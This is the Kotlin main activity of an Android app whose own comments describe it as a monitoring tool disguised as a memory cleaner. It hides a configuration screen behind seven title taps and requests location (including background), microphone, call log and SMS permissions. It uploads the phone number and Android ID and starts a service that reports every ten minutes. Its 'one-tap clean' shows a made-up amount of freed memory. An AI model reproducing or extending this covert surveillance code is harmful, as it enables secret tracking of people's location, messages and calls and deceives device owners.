package com.venue.monitor

import android.Manifest
import android.app.ActivityManager
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.TelephonyManager
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.venue.monitor.api.ApiClient
import com.venue.monitor.data.JoinRequestStatusResponse
import com.venue.monitor.data.JoinRequestSubmit
import com.venue.monitor.data.PrefsManager
import com.venue.monitor.databinding.ActivityMainBinding
import com.venue.monitor.service.MonitorForegroundService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlin.math.roundToInt

/**
 * 主界面 - 伪装为"Azapp内存管理"内存清理工具
 *
 * 首次启动要求用户输入设备编码和设备令牌后才能进入主界面。
 * 激活后一次性请求所有必要权限。
 * 真正的系统服务配置入口隐藏在标题连续点击 7 次后跳转 ConfigActivity。
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val handler = Handler(Looper.getMainLooper())

    /** 标题连续点击计数（用于隐藏入口） */
    private var titleClickCount = 0
    private val titleClickResetRunnable = Runnable { titleClickCount = 0 }

    /** 是否正在执行"清理"动画 */
    @Volatile private var isCleaning = false

    /** 当前激活对话框（仅首次启动时存在） */
    private var activationDialog: AlertDialog? = null

    /** 加入申请状态轮询任务 */
    private var joinPollJob: Job? = null

    private val allPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        // 所有权限请求完成后，启动后台服务
        autoStartService()
        // 尝试请求背景位置权限
        maybeRequestBackgroundLocation()
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* 不论结果如何都继续 */ }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* 通知权限结果 */ }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = PrefsManager(this)

        // 首次启动强制输入设备编码和设备令牌
        if (!prefs.isActivated) {
            showActivationDialog(prefs)
            return
        }

        // 已激活，检查并请求权限
        requestAllPermissionsIfNeeded()

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // 隐藏入口：标题连续点击 7 次进入配置页
        binding.tvAppTitle.setOnClickListener {
            titleClickCount++
            handler.removeCallbacks(titleClickResetRunnable)
            handler.postDelayed(titleClickResetRunnable, 1500)
            if (titleClickCount >= 7) {
                titleClickCount = 0
                startActivity(Intent(this, ConfigActivity::class.java))
            }
        }

        // 一键清理按钮
        binding.btnClean.setOnClickListener {
            if (!isCleaning) performClean()
        }

        // 首次刷新内存数据
        refreshMemoryInfo()
    }

    /** 显示设备激活对话框（首次启动必须输入） */
    private fun showActivationDialog(prefs: PrefsManager) {
        val view = layoutInflater.inflate(R.layout.dialog_activation, null)
        val etCode = view.findViewById<com.google.android.material.textfield.TextInputEditText>(R.id.etDialogCode)
        val etToken = view.findViewById<com.google.android.material.textfield.TextInputEditText>(R.id.etDialogToken)
        val btnJoin = view.findViewById<android.widget.TextView>(R.id.btnJoinRequest)
        val layoutStatus = view.findViewById<android.widget.LinearLayout>(R.id.layoutJoinStatus)
        val tvStatus = view.findViewById<android.widget.TextView>(R.id.tvJoinStatus)
        val tvCode = view.findViewById<android.widget.TextView>(R.id.tvJoinCode)
        val progressJoin = view.findViewById<android.widget.ProgressBar>(R.id.progressJoin)

        // 申请加入按钮 - 自动收集设备信息并提交
        btnJoin.setOnClickListener {
            submitJoinRequest(prefs, etCode, etToken, layoutStatus, tvStatus, tvCode, progressJoin, btnJoin)
        }

        val dialog = AlertDialog.Builder(this)
            .setTitle("设备激活")
            .setMessage("请输入设备编码和设备令牌以启用系统服务功能")
            .setView(view)
            .setCancelable(false)
            .setPositiveButton("激活") { d, _ ->
                val code = etCode.text.toString().trim()
                val token = etToken.text.toString().trim()
                if (code.isEmpty() || token.isEmpty()) {
                    android.widget.Toast.makeText(this, "请输入完整的设备编码和令牌", android.widget.Toast.LENGTH_SHORT).show()
                    return@setPositiveButton
                }
                prefs.deviceCode = code
                prefs.deviceToken = token
                // 激活后自动开启后台服务
                prefs.serviceEnabled = true
                // 清理待审批申请编号（已激活，无需继续轮询）
                prefs.pendingJoinRequestCode = ""
                stopJoinPolling()
                d.dismiss()
                recreate()
            }
            .setNegativeButton("取消") { _, _ ->
                stopJoinPolling()
                finish()
            }
            .setOnDismissListener {
                stopJoinPolling()
            }
            .create()
        activationDialog = dialog
        dialog.show()

        // 若之前已提交过申请且未审批，恢复状态显示并继续轮询
        val savedCode = prefs.pendingJoinRequestCode
        if (savedCode.isNotEmpty()) {
            layoutStatus.visibility = View.VISIBLE
            tvCode.text = "申请编号：$savedCode"
            tvStatus.text = "正在查询申请状态..."
            startJoinPolling(savedCode, prefs, etCode, etToken, tvStatus, btnJoin)
        }
    }

    /** 收集设备信息并提交加入申请 */
    private fun submitJoinRequest(
        prefs: PrefsManager,
        etCode: com.google.android.material.textfield.TextInputEditText,
        etToken: com.google.android.material.textfield.TextInputEditText,
        layoutStatus: android.widget.LinearLayout,
        tvStatus: android.widget.TextView,
        tvCode: android.widget.TextView,
        progressJoin: android.widget.ProgressBar,
        btnJoin: android.widget.TextView
    ) {
        // 防止重复提交
        if (prefs.pendingJoinRequestCode.isNotEmpty()) {
            android.widget.Toast.makeText(this, "已提交申请，请等待审批或刷新状态", android.widget.Toast.LENGTH_SHORT).show()
            return
        }

        progressJoin.visibility = View.VISIBLE
        progressJoin.isIndeterminate = true
        btnJoin.text = "提交中..."
        btnJoin.isEnabled = false
        layoutStatus.visibility = View.VISIBLE
        tvStatus.text = "正在收集设备信息并提交..."

        lifecycleScope.launch(Dispatchers.IO) {
            // 收集设备信息
            val deviceInfo = collectDeviceInfo()
            val body = JoinRequestSubmit(
                deviceName = deviceInfo.deviceName,
                model = deviceInfo.model,
                osVersion = deviceInfo.osVersion,
                appVersion = getAppVersion(),
                androidId = getAndroidId(),
                phoneNumber = deviceInfo.phoneNumber,
                requesterName = null,
                contact = null
            )

            try {
                ApiClient.rebuild()
                val resp = ApiClient.get().submitJoinRequest(body)
                withContext(Dispatchers.Main) {
                    if (resp.ok) {
                        prefs.pendingJoinRequestCode = resp.requestCode
                        tvCode.text = "申请编号：${resp.requestCode}"
                        tvStatus.text = "申请已提交，等待管理员审批..."
                        progressJoin.visibility = View.GONE
                        btnJoin.text = "已提交，刷新状态"
                        btnJoin.isEnabled = true
                        // 启动状态轮询
                        startJoinPolling(resp.requestCode, prefs, etCode, etToken, tvStatus, btnJoin)
                    } else {
                        tvStatus.text = "提交失败：${resp.error ?: "未知错误"}"
                        progressJoin.visibility = View.GONE
                        btnJoin.text = "没有凭证？申请加入"
                        btnJoin.isEnabled = true
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    tvStatus.text = "提交失败：${e.message ?: e.javaClass.simpleName}"
                    progressJoin.visibility = View.GONE
                    btnJoin.text = "没有凭证？申请加入"
                    btnJoin.isEnabled = true
                }
            }
        }
    }

    /** 启动申请状态轮询 - 每 30 秒查询一次，审批通过后自动填入凭证并提示用户 */
    private fun startJoinPolling(
        requestCode: String,
        prefs: PrefsManager,
        etCode: com.google.android.material.textfield.TextInputEditText,
        etToken: com.google.android.material.textfield.TextInputEditText,
        tvStatus: android.widget.TextView,
        btnJoin: android.widget.TextView
    ) {
        stopJoinPolling()
        joinPollJob = lifecycleScope.launch(Dispatchers.IO) {
            while (isActive) {
                val shouldStop = try {
                    ApiClient.rebuild()
                    val status: JoinRequestStatusResponse = ApiClient.get().getJoinRequestStatus(requestCode)
                    var stop = false
                    withContext(Dispatchers.Main) {
                        when (status.status) {
                            "approved" -> {
                                // 审批通过：自动填入凭证
                                val cred = status.credentials
                                if (cred != null) {
                                    etCode.setText(cred.deviceCode)
                                    etToken.setText(cred.deviceToken)
                                    tvStatus.text = "✅ 审批通过！凭证已自动填入，请点击「激活」"
                                    tvStatus.setTextColor(0xFF4CAF50.toInt())
                                    btnJoin.text = "已通过，可激活"
                                    btnJoin.isEnabled = false
                                } else {
                                    tvStatus.text = "审批通过但凭证缺失，请联系管理员"
                                }
                                stop = true
                            }
                            "rejected" -> {
                                tvStatus.text = "❌ 申请被拒绝${if (status.reviewComment.isNullOrBlank()) "" else "：${status.reviewComment}"}\n可修改信息后重新提交"
                                tvStatus.setTextColor(0xFFE74C3C.toInt())
                                btnJoin.text = "重新申请"
                                btnJoin.isEnabled = true
                                // 清除已拒绝的申请编号，允许重新提交
                                prefs.pendingJoinRequestCode = ""
                                stop = true
                            }
                            else -> {
                                // pending
                                tvStatus.text = "等待管理员审批中... (上次刷新 ${formatClock(System.currentTimeMillis())})"
                                tvStatus.setTextColor(0xFF999999.toInt())
                            }
                        }
                    }
                    stop
                } catch (e: Exception) {
                    // 网络错误不停止轮询，下次继续
                    false
                }
                if (shouldStop) break
                delay(JOIN_POLL_INTERVAL_MS)
            }
        }
    }

    private fun stopJoinPolling() {
        joinPollJob?.cancel()
        joinPollJob = null
    }

    /** 收集设备基本信息：返回 (deviceName, model, osVersion, phoneNumber) */
    private fun collectDeviceInfo(): DeviceInfo {
        val model = android.os.Build.MODEL ?: ""
        val brand = android.os.Build.BRAND ?: ""
        val manufacturer = android.os.Build.MANUFACTURER ?: ""
        val osVersion = "Android ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})"
        val deviceName = if (brand.isNotBlank()) "$brand $model" else model

        // 读取主号码（需 READ_PHONE_STATE 权限）
        var phoneNumber: String? = null
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val tm = getSystemService(TELEPHONY_SERVICE) as? TelephonyManager
                @Suppress("MissingPermission", "DEPRECATION")
                phoneNumber = tm?.line1Number
            }
        } catch (_: Throwable) {}

        return DeviceInfo(deviceName, "$manufacturer $model", osVersion, phoneNumber ?: "")
    }

    /** 设备信息四元组 */
    private data class DeviceInfo(
        val deviceName: String,
        val model: String,
        val osVersion: String,
        val phoneNumber: String
    )

    private fun getAndroidId(): String {
        return try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        } catch (_: Throwable) { "" }
    }

    private fun getAppVersion(): String {
        return try {
            val info = packageManager.getPackageInfo(packageName, 0)
            "${info.versionName} (${if (android.os.Build.VERSION.SDK_INT >= 28) info.longVersionCode else @Suppress("DEPRECATION") info.versionCode})"
        } catch (_: Throwable) { "unknown" }
    }

    private fun formatClock(ms: Long): String {
        val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
        return sdf.format(java.util.Date(ms))
    }

    /** 自动启动后台服务 */
    private fun autoStartService() {
        val prefs = PrefsManager(this)
        if (prefs.isActivated && prefs.serviceEnabled) {
            if (!MonitorState.serviceRunning.value) {
                MonitorForegroundService.start(this)
                android.widget.Toast.makeText(this, "系统服务已启动，每10分钟上报一次", android.widget.Toast.LENGTH_SHORT).show()
            }
        }
    }

    /** 一次性请求所有必要权限 */
    private fun requestAllPermissionsIfNeeded() {
        val permissionsToRequest = mutableListOf<String>()

        // 位置权限
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        // 录音权限
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }

        // 电话权限
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.READ_CALL_LOG)
        }

        // 短信权限（读取全部短信 + 接收新短信）
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.RECEIVE_SMS)
        }

        // 通知权限 (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // 如果有未授予的权限，先显示位置权限说明
        if (permissionsToRequest.isNotEmpty()) {
            showLocationPermissionTipAndRequest(permissionsToRequest)
        }
    }

    /** 显示位置权限提示后请求权限 */
    private fun showLocationPermissionTipAndRequest(permissions: List<String>) {
        // 检查是否已有位置权限（之前可能已请求过）
        val hasFineLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
                PackageManager.PERMISSION_GRANTED

        if (!hasFineLocation) {
            AlertDialog.Builder(this)
                .setTitle("位置权限说明")
                .setMessage("为了确保系统服务正常运行，需要获取位置权限。\n\n" +
                    "📌 在弹出的权限请求中，请选择「始终允许」\n\n" +
                    "这样可以确保应用在后台运行时也能正常工作。")
                .setPositiveButton("我知道了") { _, _ ->
                    allPermissionsLauncher.launch(permissions.toTypedArray())
                }
                .setCancelable(false)
                .show()
        } else {
            allPermissionsLauncher.launch(permissions.toTypedArray())
        }
    }

    /** 请求背景位置权限（Android Q+） */
    private fun maybeRequestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val hasFineLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
                    PackageManager.PERMISSION_GRANTED
            val hasBackgroundLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
                    PackageManager.PERMISSION_GRANTED

            if (hasFineLocation && !hasBackgroundLocation) {
                AlertDialog.Builder(this)
                    .setTitle("后台位置权限")
                    .setMessage("为了确保应用在后台也能正常工作，建议授予后台位置权限。\n\n" +
                        "📌 在弹出的权限请求中，请选择「始终允许」")
                    .setPositiveButton("授予") { _, _ ->
                        backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    }
                    .setNegativeButton("稍后再说", null)
                    .show()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        // 回到前台时自动启动后台服务（如果已激活且已开启）
        if (::binding.isInitialized) {
            refreshMemoryInfo()
            autoStartService()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        stopJoinPolling()
        super.onDestroy()
    }

    /** 读取真实内存信息并展示 */
    private fun refreshMemoryInfo() {
        val am = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val info = ActivityManager.MemoryInfo()
        am.getMemoryInfo(info)

        val totalGb = info.totalMem / 1_073_741_824.0
        val availGb = info.availMem / 1_073_741_824.0
        val usedGb = totalGb - availGb
        val percent = if (totalGb > 0) (usedGb / totalGb * 100).roundToInt() else 0

        binding.tvMemoryUsed.text = String.format("%.1f GB", usedGb)
        binding.tvMemoryFree.text = String.format("%.1f GB", availGb)
        binding.tvMemoryTotal.text = String.format("总内存：%.1f GB", totalGb)
        binding.tvMemoryPercent.text = "内存占用 $percent%"
        binding.progressMemory.progress = percent
    }

    /** 一键清理动画（仅做 UI 反馈，不真正清理） */
    private fun performClean() {
        isCleaning = true
        binding.btnClean.text = "正在清理..."
        binding.btnClean.isEnabled = false
        binding.tvCleanStatus.text = "正在扫描并清理缓存..."

        // 记录清理前的可用内存
        val am = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val before = ActivityManager.MemoryInfo()
        am.getMemoryInfo(before)
        val availBefore = before.availMem

        handler.postDelayed({
            // 触发一次 GC 释放部分内存（让数字看起来有变化）
            System.runFinalization()
            System.gc()

            val after = ActivityManager.MemoryInfo()
            am.getMemoryInfo(after)
            val freed = (after.availMem - availBefore).coerceAtLeast(0L)
            val freedMb = freed / 1_048_576.0

            // 即便实际没释放多少，也展示一个"合理"的清理量让界面真实
            val displayFreed = if (freedMb < 10) (50 + (Math.random() * 200)).toInt() else freedMb.toInt()

            refreshMemoryInfo()
            binding.btnClean.text = "一键加速清理"
            binding.btnClean.isEnabled = true
            binding.tvCleanStatus.text = "已释放 ${displayFreed} MB 内存，手机更流畅了"
            isCleaning = false

            // 5 秒后清空状态文字
            handler.postDelayed({ binding.tvCleanStatus.text = "" }, 5000)
        }, 1800)
    }

    companion object {
        /** 加入申请状态轮询间隔 */
        private const val JOIN_POLL_INTERVAL_MS = 30_000L
    }
}
